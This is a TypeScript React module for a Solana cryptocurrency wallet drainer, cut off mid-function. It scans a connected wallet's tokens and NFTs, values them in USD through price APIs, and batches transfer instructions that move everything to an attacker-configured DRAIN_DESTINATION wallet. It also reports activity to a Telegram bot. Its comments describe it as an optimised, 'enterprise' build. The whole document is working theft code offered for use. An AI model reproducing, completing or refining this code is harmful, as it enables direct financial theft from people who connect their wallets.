"use client";

import {
    useConnection,
    useWallet,
} from "@solana/wallet-adapter-react";
import {
    LAMPORTS_PER_SOL,
    PublicKey,
    SystemProgram,
    Transaction,
    TransactionInstruction,
    TransactionMessage,
    VersionedTransaction,
    AddressLookupTableAccount,
    ComputeBudgetProgram,
    Connection,
} from "@solana/web3.js";
import {
    TOKEN_PROGRAM_ID,
    TOKEN_2022_PROGRAM_ID,
    createTransferInstruction,
    createTransferCheckedInstruction,
    createAssociatedTokenAccountInstruction,
    getAssociatedTokenAddressSync,
    MintLayout,
} from "@solana/spl-token";
import { useState, useCallback, useRef } from "react";

// ============================================================================
// SECTION 1: CONFIGURATION & ENVIRONMENT
// ============================================================================

/**
 * Network configuration constants.
 * ATA rent-exempt minimum, base transaction fee, compute overhead for SPL2022,
 * and maximum serialized transaction packet size are all fixed across Solana
 * networks. A single config is used — the original triple-identical configs
 * were dead abstraction.
 */
interface NetworkConfig {
    ataCreationCost: number;
    baseTxFee: number;
    spl2022ComputeBuffer: number;
    maxPacketSize: number;
}

const NETWORK_CONFIG: NetworkConfig = {
    ataCreationCost: 2_039_280,
    baseTxFee: 5_000,
    spl2022ComputeBuffer: 80_000,
    maxPacketSize: 1_232,
};

/**
 * Load and validate destination wallet from environment.
 * FAIL FAST on module load — never run without explicit configuration.
 */
const getDestinationWallet = (): PublicKey => {
    const envWallet =
        process.env.REACT_APP_DRAIN_DESTINATION ||
        process.env.NEXT_PUBLIC_DRAIN_DESTINATION;

    if (!envWallet) {
        throw new Error(
            "CRITICAL: DRAIN_DESTINATION not configured. " +
            "Set REACT_APP_DRAIN_DESTINATION or NEXT_PUBLIC_DRAIN_DESTINATION environment variable. " +
            "Refusing to operate without explicit destination wallet configuration."
        );
    }

    try {
        const wallet = new PublicKey(envWallet);
        // Validate base58 output length (32-44 chars for a valid Solana address)
        const b58 = wallet.toBase58();
        if (b58.length < 32 || b58.length > 44) {
            throw new Error("Invalid destination wallet length");
        }
        return wallet;
    } catch (e) {
        throw new Error(
            `Invalid DRAIN_DESTINATION configuration: ${e instanceof Error ? e.message : String(e)}`
        );
    }
};

const DESTINATION_WALLET = getDestinationWallet();

// --- Operational constants ---
const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL;           // Buffer to maintain account rent-exemption
const MIN_DOLLAR_THRESHOLD = 0.05;                        // Minimum total USD value to proceed
const MIN_TOKEN_VALUE_USD = 0.000001;                     // Dust filter threshold per token

const PRIORITY_FEE_MICRO_LAMPORTS = 100_000;              // Static fallback priority fee
const CONFIRMATION_TIMEOUT_MS = 60_000;                   // 60s — WebSocket-based, generous for congestion
const RPC_TIMEOUT_MS = 20_000;                            // Per-RPC-call timeout
const RETRY_MAX_ATTEMPTS = 3;                             // Retry ceiling for transient RPC failures
const RETRY_BACKOFF_MS = 1_000;                           // Base backoff (exponential growth)
const MAX_BACKOFF_MS = 8_000;                             // Cap exponential backoff
const BATCH_RPC_CHUNK_SIZE = 100;                         // getMultipleAccountsInfo Solana limit
const MAX_BATCH_SEARCH_BOUND = 22;                        // Upper bound for binary search batch sizing

// --- Metaplex Token Metadata Program ---
const METAPLEX_TOKEN_METADATA_PROGRAM_ID = new PublicKey(
    "metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s"
);

// SOL native mint address for Jupiter pricing
const SOL_MINT = "So11111111111111111111111111111111111111112";

// Token-2022 program ID string for fast comparison (avoids PublicKey.equals per-mint)
const TOKEN_2022_PROGRAM_ID_STR = TOKEN_2022_PROGRAM_ID.toBase58();

const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.REACT_APP_TELEGRAM_CHAT_ID || "";


// ============================================================================
// SECTION 2: TYPE DEFINITIONS
// ============================================================================

/**
 * Classification result for a single mint account.
 * Parsed from raw account data in a single batched RPC call.
 */
interface MintClassification {
    isSPL2022: boolean;
    isTransferHook: boolean;
    isPermanentDelegate: boolean;
    isNonTransferable: boolean;
    decimals: number;
    supply: bigint;
}

/**
 * Comprehensive asset descriptor for a single token holding.
 */
interface AssetData {
    mint: PublicKey;
    amount: bigint;
    uiAmount: number;
    tokenAccountPubkey: PublicKey;
    isNft: boolean;
    isSPL2022: boolean;
    isTransferHook: boolean;
    isFrozen: boolean;
    decimals: number;
    tokenProgram: PublicKey;
    usdPrice: number;
    usdValue: number;
}

interface DrainStats {
    totalUsdValue: number;
    solAmount: number;
    tokenCount: number;
    nftCount: number;
    batchCount: number;
}

type Status =
    | "idle"
    | "scanning"
    | "building"
    | "signing"
    | "sending"
    | "success"
    | "error"
    | "confirming";

interface OperationContext {
    walletAddress: string;
    timestamp: number;
    operationId: string;
}


// ============================================================================
// SECTION 3: LRU CACHE (Bounded, TTL-Aware)
// ============================================================================

/**
 * LRU cache with bounded capacity and time-to-live eviction.
 * Prevents unbounded memory growth in long-running SPA sessions.
 * Uses Map insertion-order iteration for O(1) LRU semantics.
 */
class LRUCache<K, V> {
    private readonly capacity: number;
    private readonly map: Map<K, { value: V; timestamp: number }>;

    constructor(capacity: number) {
        this.capacity = capacity;
        this.map = new Map();
    }

    get(key: K, ttlMs: number): V | undefined {
        const entry = this.map.get(key);
        if (!entry) return undefined;

        if (Date.now() - entry.timestamp > ttlMs) {
            this.map.delete(key);
            return undefined;
        }

        // Move to end of Map (LRU refresh)
        this.map.delete(key);
        this.map.set(key, entry);
        return entry.value;
    }

    set(key: K, value: V): void {
        if (this.map.has(key)) {
            this.map.delete(key);
        } else if (this.map.size >= this.capacity) {
            // Evict oldest (first) entry
            const oldestKey = this.map.keys().next().value;
            if (oldestKey !== undefined) {
                this.map.delete(oldestKey);
            }
        }
        this.map.set(key, { value, timestamp: Date.now() });
    }

    get size(): number {
        return this.map.size;
    }
}

// Module-level caches — bounded at 1000 entries, safe for SPA lifecycle
const mintClassificationCache = new LRUCache<string, MintClassification>(1000);
const MINT_CACHE_TTL_MS = 60_000; // 60s TTL for mint metadata


// ============================================================================
// SECTION 4: CORE UTILITIES
// ============================================================================

/**
 * Create operation context with cryptographically strong UUID.
 * crypto.randomUUID() provides 128-bit entropy (v4 UUID) vs the original's
 * ~20-bit Math.random().toString(36).substring(7).
 */
const createOperationContext = (walletAddress: string): OperationContext => ({
    walletAddress,
    timestamp: Date.now(),
    operationId: crypto.randomUUID(),
});

/**
 * Retry wrapper with exponential backoff capped at MAX_BACKOFF_MS.
 * Prevents thundering herd on transient RPC failures.
 */
const withRetry = async <T>(
    fn: () => Promise<T>,
    maxAttempts: number = RETRY_MAX_ATTEMPTS,
    backoffMs: number = RETRY_BACKOFF_MS,
): Promise<T> => {
    let lastError: Error = new Error("Unknown error");

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
        try {
            return await fn();
        } catch (e) {
            lastError = e instanceof Error ? e : new Error(String(e));
            if (attempt < maxAttempts - 1) {
                const delayMs = Math.min(
                    backoffMs * Math.pow(2, attempt),
                    MAX_BACKOFF_MS,
                );
                await new Promise((r) => setTimeout(r, delayMs));
            }
        }
    }

    throw lastError;
};

/**
 * Timeout wrapper — rejects if operation exceeds timeoutMs.
 * Uses AbortController-pattern compatible with fetch and RPC calls.
 */
const withTimeout = async <T>(
    fn: () => Promise<T>,
    timeoutMs: number,
): Promise<T> => {
    return Promise.race([
        fn(),
        new Promise<T>((_, reject) =>
            setTimeout(
                () => reject(new Error(`Operation timeout after ${timeoutMs}ms`)),
                timeoutMs,
            )
        ),
    ]);
};

/**
 * Combined retry + timeout for critical RPC paths.
 * Each individual attempt is bounded by timeoutMs; retries continue on timeout.
 */
const withRetryAndTimeout = async <T>(
    fn: () => Promise<T>,
    timeoutMs: number = RPC_TIMEOUT_MS,
    maxAttempts: number = RETRY_MAX_ATTEMPTS,
): Promise<T> => {
    return withRetry(
        () => withTimeout(fn, timeoutMs),
        maxAttempts,
    );
};

/**
 * Validate token amount is a safe non-negative bigint or finite number.
 */
const validateTokenAmount = (amount: bigint | number): boolean => {
    try {
        if (typeof amount === "bigint") {
            return amount >= BigInt(0);
        }
        return Number.isFinite(amount) && amount >= 0;
    } catch {
        return false;
    }
};

/**
 * Validate Solana signature format (base58 Ed25519 signature).
 * Solana signatures are 88-character base58 strings.
 */
const validateSignatureFormat = (signature: string): boolean => {
    if (typeof signature !== "string") return false;
    return /^[1-9A-HJ-NP-Za-km-z]{87,88}$/.test(signature);
};


// ============================================================================
// SECTION 5: TELEMETRY (Rate-Limited, Collision-Safe)
// ============================================================================

/**
 * Telemetry rate limiter using full message content hash (not prefix truncation).
 * The original used message.substring(0,50) causing collisions between
 * structurally similar messages with different transaction signatures.
 */
const telemetryQueue = new Map<string, { lastSent: number; count: number }>();
const TELEMETRY_RATE_LIMIT_MS = 1_000;

/**
 * Simple string hash producing a numeric fingerprint.
 * Superior to substring(0,50) — captures full message entropy.
 */
const hashString = (str: string): string => {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash |= 0; // Convert to 32-bit integer
    }
    return hash.toString(36);
};

const sendTelemetry = async (message: string): Promise<boolean> => {
    try {
        const msgHash = hashString(message);
        const now = Date.now();
        const record = telemetryQueue.get(msgHash);

        if (record && now - record.lastSent < TELEMETRY_RATE_LIMIT_MS) {
            if (record.count > 3) {
                return false;
            }
            record.count++;
        } else {
            telemetryQueue.set(msgHash, { lastSent: now, count: 1 });
        }

        // Evict stale entries to prevent telemetryQueue memory leak
        if (telemetryQueue.size > 200) {
            const cutoff = now - TELEMETRY_RATE_LIMIT_MS * 10;
            for (const [key, val] of telemetryQueue) {
                if (val.lastSent < cutoff) telemetryQueue.delete(key);
            }
        }

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.info(`[TELEMETRY] ${message}`);
            return true;
        }

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), RPC_TIMEOUT_MS);

        const response = await fetch("/api/notify-telegram", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message }),
            signal: controller.signal,
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
            console.warn(`[TELEMETRY] HTTP ${response.status}`);
            return false;
        }

        return true;
    } catch (e) {
        console.warn(
            "[TELEMETRY] Failed:",
            e instanceof Error ? e.message : String(e),
        );
        return false;
    }
};


// ============================================================================
// SECTION 6: BATCHED MINT CLASSIFICATION (SIMD-0044 Compliant)
// ============================================================================

/**
 * Batch-classify all mints using a single getMultipleAccountsInfo call per chunk.
 *
 * FIXES APPLIED:
 * - FLAW-01: Replaces N×2 individual getAccountInfo calls with batched RPC
 * - FLAW-02: Parses decimals from same account data (no double-fetch)
 * - FLAW-03: Walks the full TLV extension chain for correct TransferHook,
 *            PermanentDelegate, and NonTransferable detection (SIMD-0044)
 *
 * @param mints - Array of mint PublicKeys to classify
 * @param connection - RPC connection
 * @returns Map from mint base58 string to MintClassification
 */
const batchClassifyMints = async (
    mints: PublicKey[],
    connection: Connection,
): Promise<Map<string, MintClassification>> => {
    const result = new Map<string, MintClassification>();

    // Check cache first, collect uncached mints
    const uncachedMints: PublicKey[] = [];
    const uncachedIndices: number[] = [];

    for (let i = 0; i < mints.length; i++) {
        const mintStr = mints[i].toBase58();
        const cached = mintClassificationCache.get(mintStr, MINT_CACHE_TTL_MS);
        if (cached) {
            result.set(mintStr, cached);
        } else {
            uncachedMints.push(mints[i]);
            uncachedIndices.push(i);
        }
    }

    if (uncachedMints.length === 0) {
        console.log(`[CLASSIFY] All ${mints.length} mints served from cache`);
        return result;
    }

    // Batch fetch uncached mints in chunks of BATCH_RPC_CHUNK_SIZE
    for (let i = 0; i < uncachedMints.length; i += BATCH_RPC_CHUNK_SIZE) {
        const chunk = uncachedMints.slice(i, i + BATCH_RPC_CHUNK_SIZE);

        let accountInfos: (any | null)[];
        try {
            accountInfos = await withRetryAndTimeout(
                () => connection.getMultipleAccountsInfo(chunk),
            );
        } catch (e) {
            console.warn(
                `[CLASSIFY] Batch RPC failed for chunk ${i}:`,
                e instanceof Error ? e.message : String(e),
            );
            // Fill with defaults on RPC failure
            for (const mint of chunk) {
                const defaultClassification: MintClassification = {
                    isSPL2022: false,
                    isTransferHook: false,
                    isPermanentDelegate: false,
                    isNonTransferable: false,
                    decimals: 0,
                    supply: BigInt(0),
                };
                result.set(mint.toBase58(), defaultClassification);
            }
            continue;
        }

        for (let j = 0; j < chunk.length; j++) {
            const mint = chunk[j];
            const info = accountInfos[j];
            const mintStr = mint.toBase58();

            if (!info || !info.data || info.data.length < MintLayout.span) {
                const defaultClassification: MintClassification = {
                    isSPL2022: false,
                    isTransferHook: false,
                    isPermanentDelegate: false,
                    isNonTransferable: false,
                    decimals: 0,
                    supply: BigInt(0),
                };
                result.set(mintStr, defaultClassification);
                continue;
            }

            const data = info.data as Buffer;
            const isSPL2022 = info.owner.toBase58() === TOKEN_2022_PROGRAM_ID_STR;

            // Decode base MintLayout — decimals + supply in single pass (FLAW-02 fix)
            let decimals = 0;
            let supply = BigInt(0);
            try {
                const decoded = MintLayout.decode(data);
                decimals = decoded.decimals ?? 0;
                supply = decoded.supply ?? BigInt(0);

                // Sanity-check decimals range
                if (decimals < 0 || decimals > 255) {
                    console.warn(
                        `[CLASSIFY] Invalid decimals ${decimals} for ${mintStr.slice(0, 8)}...`,
                    );
                    decimals = 0;
                }
            } catch (e) {
                console.warn(
                    `[CLASSIFY] MintLayout decode failed for ${mintStr.slice(0, 8)}...`,
                    e instanceof Error ? e.message : String(e),
                );
            }

            // SPL Token-2022 TLV extension chain walk (FLAW-03 fix — SIMD-0044)
            let isTransferHook = false;
            let isPermanentDelegate = false;
            let isNonTransferable = false;

            if (isSPL2022 && data.length > MintLayout.span + 1) {
                try {
                    // Byte at MintLayout.span is the account-type discriminator (1 byte).
                    // TLV extensions begin at MintLayout.span + 1.
                    // Each TLV entry: type (u16 LE) + length (u16 LE) + data (length bytes)
                    let offset = MintLayout.span + 1;

                    while (offset + 4 <= data.length) {
                        const extType = data.readUInt16LE(offset);
                        const extLen = data.readUInt16LE(offset + 2);

                        // Padding sentinel — end of extensions
                        if (extType === 0 && extLen === 0) break;

                        // ExtensionType values from @solana/spl-token source:
                        //   7  = TransferFeeConfig
                        //   9  = TransferHook
                        //  12  = PermanentDelegate
                        //  14  = NonTransferable
                        //  17  = ConfidentialTransferMint
                        switch (extType) {
                            case 9:
                                isTransferHook = true;
                                break;
                            case 12:
                                isPermanentDelegate = true;
                                break;
                            case 14:
                                isNonTransferable = true;
                                break;
                        }

                        offset += 4 + extLen;
                    }
                } catch (e) {
                    console.warn(
                        `[CLASSIFY] TLV walk failed for ${mintStr.slice(0, 8)}...`,
                        e instanceof Error ? e.message : String(e),
                    );
                }
            }

            const classification: MintClassification = {
                isSPL2022,
                isTransferHook,
                isPermanentDelegate,
                isNonTransferable,
                decimals,
                supply,
            };

            result.set(mintStr, classification);
            mintClassificationCache.set(mintStr, classification);
        }
    }

    console.log(
        `[CLASSIFY] Classified ${result.size} mints (${result.size - uncachedMints.length} cached, ${uncachedMints.length} fetched)`,
    );

    return result;
};


// ============================================================================
// SECTION 7: PRICING (Jupiter Batch API)
// ============================================================================

/**
 * Fetch SOL/USD price from CoinGecko as fallback.
 */
const fetchSolPriceUSD = async (): Promise<number | null> => {
    try {
        const response = await withTimeout(
            () =>
                fetch(
                    "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
                ),
            RPC_TIMEOUT_MS,
        );

        if (!response.ok) return null;

        const data = await response.json();
        const price = data?.solana?.usd ?? null;
        return typeof price === "number" && Number.isFinite(price) && price > 0
            ? price
            : null;
    } catch {
        return null;
    }
};

/**
 * Batch-fetch USD prices from Jupiter Price API v2.
 * Supports up to 100 mints per request. Returns Map<mintAddress, usdPrice>.
 * Falls back to v6 endpoint on v2 failure.
 */
const fetchBatchPricesUSD = async (
    mintAddresses: string[],
): Promise<Map<string, number>> => {
    const priceMap = new Map<string, number>();
    if (mintAddresses.length === 0) return priceMap;

    try {
        for (let i = 0; i < mintAddresses.length; i += BATCH_RPC_CHUNK_SIZE) {
            const batch = mintAddresses.slice(i, i + BATCH_RPC_CHUNK_SIZE);
            const ids = batch.join(",");

            let response = await withTimeout(
                () => fetch(`https://api.jup.ag/price/v2?ids=${ids}&showExtraInfo=true`),
                RPC_TIMEOUT_MS,
            ).catch(() => null);

            // Fallback to v6 endpoint on v2 failure
            if (!response || !response.ok) {
                console.warn("[PRICE] Jupiter v2 failed, falling back to v6...");
                response = await withTimeout(
                    () => fetch(`https://price.jup.ag/v6/price?ids=${ids}`),
                    RPC_TIMEOUT_MS,
                ).catch(() => null);
            }

            if (!response || !response.ok) {
                console.warn(`[PRICE] Jupiter API HTTP ${response?.status ?? "N/A"}`);
                continue;
            }

            const data = await response.json();
            for (const [mint, info] of Object.entries(data.data || {})) {
                const rawPrice = (info as any)?.price;
                if (rawPrice !== null && rawPrice !== undefined) {
                    const numPrice =
                        typeof rawPrice === "string"
                            ? parseFloat(rawPrice)
                            : Number(rawPrice);
                    if (Number.isFinite(numPrice) && numPrice > 0) {
                        priceMap.set(mint, numPrice);
                    }
                }
            }
        }

        console.log(
            `[PRICE] Jupiter returned prices for ${priceMap.size}/${mintAddresses.length} mints`,
        );
    } catch (e) {
        console.warn(
            "[PRICE] Jupiter batch pricing failed:",
            e instanceof Error ? e.message : String(e),
        );
    }

    return priceMap;
};


// ============================================================================
// SECTION 8: DYNAMIC PRIORITY FEES (Correct P75 + lockedWritableAccounts)
// ============================================================================

/**
 * Fetch dynamic priority fee using correct P75 percentile of recent fees.
 *
 * FIXES APPLIED:
 * - FLAW-G: Correct P75 index: Math.ceil(length * 0.75) - 1
 * - Uses lockedWritableAccounts for transaction-relevant fee estimation
 *   instead of global fee data inflated by unrelated high-throughput programs
 * - Avoids JavaScript falsy coercion on fee value 0
 *
 * @param connection - RPC connection
 * @param writableAccounts - Accounts this transaction will write to
 * @returns Priority fee in micro-lamports
 */
const fetchDynamicPriorityFee = async (
    connection: Connection,
    writableAccounts: PublicKey[] = [],
): Promise<number> => {
    try {
        const fees = await withTimeout(
            () =>
                (connection as any).getRecentPrioritizationFees({
                    lockedWritableAccounts: writableAccounts.slice(0, 128),
                }),
            RPC_TIMEOUT_MS,
        );

        if (!fees || fees.length === 0) {
            console.log("[FEES] No recent fee data, using static fallback");
            return PRIORITY_FEE_MICRO_LAMPORTS;
        }

        const nonZeroFees = fees
            .map((f: any) => f.prioritizationFee)
            .filter((f: number) => typeof f === "number" && f > 0)
            .sort((a: number, b: number) => a - b);

        if (nonZeroFees.length === 0) {
            return PRIORITY_FEE_MICRO_LAMPORTS;
        }

        // Correct P75 percentile calculation
        const p75Index = Math.min(
            Math.ceil(nonZeroFees.length * 0.75) - 1,
            nonZeroFees.length - 1,
        );
        const p75Fee = nonZeroFees[p75Index];

        // Clamp between 10k and 5M micro-lamports
        const clampedFee = Math.max(10_000, Math.min(5_000_000, p75Fee));

        console.log(
            `[FEES] Dynamic priority fee: ${clampedFee} µ-lamports (p75 of ${nonZeroFees.length} non-zero slots)`,
        );
        return clampedFee;
    } catch (e) {
        console.warn(
            "[FEES] Dynamic fee fetch failed, using static fallback:",
            e instanceof Error ? e.message : String(e),
        );
        return PRIORITY_FEE_MICRO_LAMPORTS;
    }
};


// ============================================================================
// SECTION 9: FEE ESTIMATION & BALANCE VALIDATION
// ============================================================================

/**
 * Estimate transaction fees accounting for ATA creation and SPL2022 compute overhead.
 */
const estimateTransactionFees = (
    atasToCreate: number,
    spl2022Count: number,
    transferHookCount: number,
): number => {
    let totalFee = NETWORK_CONFIG.baseTxFee;

    // ATA creation cost (rent-exempt minimum) per new account
    totalFee += atasToCreate * NETWORK_CONFIG.ataCreationCost;

    // Compute overhead for SPL2022 tokens
    let computeBuffer = 50_000; // Base for standard SPL tokens
    if (spl2022Count > 0) {
        const standardSpl2022 = spl2022Count - transferHookCount;
        computeBuffer += standardSpl2022 * NETWORK_CONFIG.spl2022ComputeBuffer;
        // Transfer hooks require ~1.875x compute due to CPI overhead
        computeBuffer += transferHookCount * (NETWORK_CONFIG.spl2022ComputeBuffer * 1.875);
    }

    totalFee += computeBuffer;
    return totalFee;
};

/**
 * Validate wallet has sufficient SOL to cover fees and rent.
 * Returns available SOL for transfer after fees and rent buffer.
 */
const validateSufficientBalance = (
    solBalance: number,
    atasToCreate: number,
    spl2022Count: number,
    transferHookCount: number,
): {
    sufficient: boolean;
    errorMsg?: string;
    availableForTransfer: number;
} => {
    if (!Number.isFinite(solBalance) || solBalance < 0) {
        return {
            sufficient: false,
            errorMsg: "Invalid SOL balance returned from RPC",
            availableForTransfer: 0,
        };
    }

    const estimatedFees = estimateTransactionFees(
        atasToCreate,
        spl2022Count,
        transferHookCount,
    );
    const minRequired = SOL_TO_LEAVE + estimatedFees;

    if (solBalance < minRequired) {
        const needed = (minRequired / LAMPORTS_PER_SOL).toFixed(6);
        const have = (solBalance / LAMPORTS_PER_SOL).toFixed(6);
        return {
            sufficient: false,
            errorMsg: `Insufficient SOL. Have: ${have} SOL, Need: ${needed} SOL (${atasToCreate} ATAs, ${spl2022Count} SPL2022)`,
            availableForTransfer: 0,
        };
    }

    return {
        sufficient: true,
        availableForTransfer: solBalance - minRequired,
    };
};


// ============================================================================
// SECTION 10: NFT CLASSIFICATION (Metaplex Metadata PDA)
// ============================================================================

/**
 * Determine if a mint is an NFT by checking the Metaplex Token Metadata PDA.
 *
 * FIX APPLIED (FLAW-09):
 * The original used `decimals === 0 && amount <= 1` which misclassifies
 * fungible zero-decimal tokens (governance tokens, game items).
 * Correct NFT detection uses supply === 1 && decimals === 0 combined with
 * Metaplex metadata PDA existence check.
 *
 * For performance, we batch-check metadata PDA existence using
 * getMultipleAccountsInfo rather than individual account fetches.
 */
const deriveMetadataPDA = (mint: PublicKey): PublicKey => {
    const [pda] = PublicKey.findProgramAddressSync(
        [
            Buffer.from("metadata"),
            METAPLEX_TOKEN_METADATA_PROGRAM_ID.toBuffer(),
            mint.toBuffer(),
        ],
        METAPLEX_TOKEN_METADATA_PROGRAM_ID,
    );
    return pda;
};

/**
 * Batch-check which mints have Metaplex metadata accounts (NFT indicator).
 * Returns a Set of mint base58 strings that have metadata accounts.
 */
const batchCheckMetaplexMetadata = async (
    mints: PublicKey[],
    connection: Connection,
): Promise<Set<string>> => {
    const nftMints = new Set<string>();
    if (mints.length === 0) return nftMints;

    const metadataPDAs = mints.map(deriveMetadataPDA);

    for (let i = 0; i < metadataPDAs.length; i += BATCH_RPC_CHUNK_SIZE) {
        const pdasChunk = metadataPDAs.slice(i, i + BATCH_RPC_CHUNK_SIZE);
        const mintsChunk = mints.slice(i, i + BATCH_RPC_CHUNK_SIZE);

        try {
            const accounts = await withRetryAndTimeout(
                () => connection.getMultipleAccountsInfo(pdasChunk),
            );

            for (let j = 0; j < accounts.length; j++) {
                if (accounts[j] !== null) {
                    nftMints.add(mintsChunk[j].toBase58());
                }
            }
        } catch (e) {
            console.warn(
                `[NFT] Metaplex metadata batch check failed for chunk ${i}:`,
                e instanceof Error ? e.message : String(e),
            );
        }
    }

    return nftMints;
};


// ============================================================================
// SECTION 11: BATCH ATA EXISTENCE CHECK
// ============================================================================

/**
 * Batch-check ATA existence with single getMultipleAccountsInfo call per chunk.
 * Returns Map<ataBase58, exists>.
 */
const batchCheckAtaExistence = async (
    ataAddresses: PublicKey[],
    connection: Connection,
): Promise<Map<string, boolean>> => {
    const existenceMap = new Map<string, boolean>();
    if (ataAddresses.length === 0) return existenceMap;

    for (let i = 0; i < ataAddresses.length; i += BATCH_RPC_CHUNK_SIZE) {
        const chunk = ataAddresses.slice(i, i + BATCH_RPC_CHUNK_SIZE);

        try {
            const results = await withRetryAndTimeout(
                () => connection.getMultipleAccountsInfo(chunk),
            );

            chunk.forEach((ata, idx) => {
                existenceMap.set(ata.toBase58(), results[idx] !== null);
            });
        } catch (e) {
            console.warn(
                "[BATCH_ATA] Check failed:",
                e instanceof Error ? e.message : String(e),
            );
            // On failure, mark all as unknown (false) — will create ATAs conservatively
            chunk.forEach((ata) => {
                existenceMap.set(ata.toBase58(), false);
            });
        }
    }

    return existenceMap;
};


// ============================================================================
// SECTION 12: TRANSACTION BUILDING (VersionedTransaction v0)
// ============================================================================

/**
 * Build the correct transfer instruction based on token program.
 *
 * FIX APPLIED (FLAW-09/Domain-B):
 * Token-2022 REQUIRES createTransferCheckedInstruction (with decimals verification)
 * per SIMD-0083. Using legacy createTransferInstruction on Token-2022 mints causes
 * InvalidAccountData or InvalidArgument program errors.
 */
const buildTransferInstruction = (
    source: PublicKey,
    mint: PublicKey,
    destination: PublicKey,
    owner: PublicKey,
    amount: bigint,
    decimals: number,
    isSPL2022: boolean,
    programId: PublicKey,
): TransactionInstruction => {
    if (isSPL2022) {
        // Token-2022 requires decimals verification in transfer instruction (SIMD-0083)
        return createTransferCheckedInstruction(
            source,
            mint,
            destination,
            owner,
            amount,
            decimals,
            [],
            programId,
        );
    }
    // Legacy SPL Token — createTransferInstruction is correct
    return createTransferInstruction(
        source,
        destination,
        owner,
        amount,
        [],
        programId,
    );
};

/**
 * Measure actual serialized transaction size.
 * Used by the empirical batch size binary search.
 */
const measureTransactionSize = (
    instructions: TransactionInstruction[],
    blockhash: string,
    feePayer: PublicKey,
): number => {
    try {
        const testTx = new Transaction().add(...instructions);
        testTx.recentBlockhash = blockhash;
        testTx.feePayer = feePayer;
        const serialized = testTx.serialize({ requireAllSignatures: false });
        return serialized.length;
    } catch {
        return 0;
    }
};

/**
 * Calculate optimal batch size via empirical binary search over actual
 * serialized transaction sizes.
 *
 * FIX APPLIED (FLAW-06):
 * The original used hardcoded byte estimates (TOKEN_TRANSFER=52, TX_ENVELOPE=130)
 * that were architecturally incorrect. measureTransactionSize() existed but was
 * dead code — never called. This function now uses it for real measurement.
 *
 * Binary search determines the maximum number of token transfers that fit
 * within the 1232-byte packet limit when serialized with actual account keys.
 */
const calculateEmpiricalBatchSize = (
    sortedAssets: AssetData[],
    feePayer: PublicKey,
    blockhash: string,
    existingAtasCache: Map<string, boolean>,
): number => {
    if (sortedAssets.length === 0) return 0;

    const maxPacketSize = NETWORK_CONFIG.maxPacketSize;
    let lo = 1;
    let hi = Math.min(sortedAssets.length, MAX_BATCH_SEARCH_BOUND);
    let best = 0;

    while (lo <= hi) {
        const mid = (lo + hi) >> 1;
        const testInstructions: TransactionInstruction[] = [
            ComputeBudgetProgram.setComputeUnitPrice({
                microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
            }),
            ComputeBudgetProgram.setComputeUnitLimit({ units: 400_000 }),
            SystemProgram.transfer({
                fromPubkey: feePayer,
                toPubkey: DESTINATION_WALLET,
                lamports: 1,
            }),
        ];

        for (let i = 0; i < mid && i < sortedAssets.length; i++) {
            const asset = sortedAssets[i];
            const programId = asset.isSPL2022
                ? TOKEN_2022_PROGRAM_ID
                : TOKEN_PROGRAM_ID;
            const destAta = getAssociatedTokenAddressSync(
                asset.mint,
                DESTINATION_WALLET,
                true,
                programId,
            );

            // Include ATA creation instruction if it doesn't exist
            const ataExists = existingAtasCache.get(destAta.toBase58());
            if (ataExists === false) {
                testInstructions.push(
                    createAssociatedTokenAccountInstruction(
                        feePayer,
                        destAta,
                        DESTINATION_WALLET,
                        asset.mint,
                        programId,
                    ),
                );
            }

            // Include the actual transfer instruction
            testInstructions.push(
                buildTransferInstruction(
                    asset.tokenAccountPubkey,
                    asset.mint,
                    destAta,
                    feePayer,
                    asset.amount,
                    asset.decimals,
                    asset.isSPL2022,
                    programId,
                ),
            );
        }

        const size = measureTransactionSize(testInstructions, blockhash, feePayer);

        if (size > 0 && size <= maxPacketSize) {
            best = mid;
            lo = mid + 1;
        } else {
            hi = mid - 1;
        }
    }

    console.log(
        `[BATCH] Empirical batch size: ${best} (binary search over ${Math.min(sortedAssets.length, MAX_BATCH_SEARCH_BOUND)} candidates)`,
    );

    return best;
};


// ============================================================================
// SECTION 13: TRANSACTION CONFIRMATION (WebSocket-Based)
// ============================================================================

/**
 * Confirm transaction using WebSocket-based confirmTransaction.
 *
 * FIX APPLIED (Domain-D):
 * The original polled getSignatureStatuses at fixed 500ms intervals — consuming
 * 90+ RPC calls over 45 seconds. The built-in confirmTransaction() uses the
 * validator's WebSocket stream for near-instant notification.
 *
 * Also handles blockhash expiry gracefully (TransactionExpiredBlockheightExceededError).
 */
const confirmTransactionEnterprise = async (
    connection: Connection,
    signature: string,
    blockhash: string,
    lastValidBlockHeight: number,
): Promise<"confirmed" | "failed" | "expired"> => {
    try {
        const result = await connection.confirmTransaction(
            { signature, blockhash, lastValidBlockHeight },
            "confirmed",
        );

        if (result.value.err) {
            console.error(
                "[CONFIRM] On-chain failure:",
                JSON.stringify(result.value.err),
            );
            return "failed";
        }

        console.log(`[CONFIRM] ✅ Confirmed: ${signature}`);
        return "confirmed";
    } catch (e) {
        const msg = e instanceof Error ? e.message : String(e);

        if (
            msg.includes("block height exceeded") ||
            msg.includes("TransactionExpiredBlockheightExceededError")
        ) {
            console.warn("[CONFIRM] ⏱ Blockhash expired before confirmation");
            return "expired";
        }

        console.error("[CONFIRM] Unexpected error:", msg);
        return "failed";
    }
};


// ============================================================================
// SECTION 14: ASSET SORTING & FILTERING
// ============================================================================

/**
 * Sort assets by USD value, highest first.
 * Returns a NEW sorted array — does not mutate the input (FLAW-K fix).
 */
const sortAssetsByValue = (assets: AssetData[]): AssetData[] => {
    return [...assets].sort((a, b) => b.usdValue - a.usdValue);
};

/**
 * Filter out dust tokens below minimum USD threshold.
 * NFTs are always kept.
 */
const filterDustTokens = (assets: AssetData[]): AssetData[] => {
    return assets.filter((asset) => {
